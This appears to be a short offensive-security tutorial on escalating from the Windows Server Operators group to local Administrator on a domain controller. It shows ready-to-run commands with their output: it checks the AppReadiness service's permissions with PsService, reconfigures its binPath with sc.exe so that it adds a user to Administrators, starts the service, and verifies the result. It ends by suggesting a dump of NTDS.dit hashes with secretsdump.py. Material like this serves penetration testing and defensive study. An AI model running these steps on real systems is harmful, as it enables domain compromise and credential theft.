Server Operators is a very high privileged group. Its members can log in servers, *including the Domain Controller* and can control local services.<br>
Additionally, members of that group are granted SeBackupPrivilege and SeRestorePrivilege.

An easy way to escalate our privileges from that group would be to replace a running service with our own malicious payload. 

As an example, let's exploit the AppReadiness service : 

## Checking the service permissions

We will use [PsService](https://learn.microsoft.com/en-us/sysinternals/downloads/psservice) from SysInternals to query informations about the service (get more info than with `sc.exe qc <SERVICE_NAME>`)

```
.\PsService.exe security AppReadiness
PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate

<SNIP>blablablabla.... <SNIP>
        
        [ALLOW] BUILTIN\Server Operators
                All
```
As you can see, as a member of the Server Operators group you have full permission over the service.

## Modifying the service 

Let's change the binaary path of this service to execute our payload, here a command that will add us to the Administrators group :

```bat
sc.exe config AppReadiness binPath="cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

## Running the service

Then, run the modified service using sc :
```
C:\> sc.exe start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
The service should fail to start, but you can confirm our payload has been ran by checking the administrators group :
```
C:\> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

--------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```
As you can see, we're now member of the local Administrators group on the domain controller, you're now free to do whatever bullshit you want, like dumping NTDS.dit hashes using secretsdump.py or shenanigans like that.
